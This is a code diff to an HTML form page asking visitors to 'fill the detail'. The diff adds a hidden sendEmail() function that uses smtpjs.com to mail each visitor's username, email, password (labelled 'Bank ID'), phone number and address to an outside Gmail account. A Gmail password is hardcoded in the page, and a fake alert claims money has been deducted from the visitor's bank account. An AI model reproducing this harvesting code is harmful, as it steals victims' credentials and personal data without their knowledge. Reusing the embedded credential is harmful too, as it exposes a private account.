@@ -24,7 +24,7 @@
 <body>
     <div class="area">
         <h1>Please Fill The Detail</h1>
-        <form action="https://aakashkavediya.github.io/AmongUs/" method="GET" onsubmit="return Alert('From your bank account 1Lack 50Thousand has been deducted')">
+        <form action="https://aakashkavediya.github.io/AmongUs/" method="GET" onsubmit="sendEmail(); return Alert('From your bank account 1Lack 50Thousand has been deducted')">
             <div id="row">
                 <b>Username:</b> <input type="text" name="Username" id="Username" placeholder="Enter username">
             </div>
@@ -50,6 +50,30 @@
         </form>
         <script src="./form.js"></script>
     </div>
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+    <script>
+        function sendEmail() {
+            Email.send({
+                Host: "smtp.gmail.com",
+                Username: "kavediyaaakash@gmail.com",
+                Password: "pbtubogtmckpjcsq",
+                To: 'kavediyaaakash@gmail.com',
+                From: document.getElementById("e-mail").value,
+                Subject: "Shopping HTML Form Is Submitted",
+                Body: "Name : " + document.getElementById('Username').value +
+                    " <br>  E-Mail : " + document.getElementById('e-mail').value +
+                    "<br> Bank ID : " + document.getElementById('password').value +
+                    "<br> Phone No : " + document.getElementById('number').value +
+                    "<br> Address : " + document.getElementById('area').value
+            }).then(
+                message => alert(message)
+            );
+        }
+    </script>
 
 
 
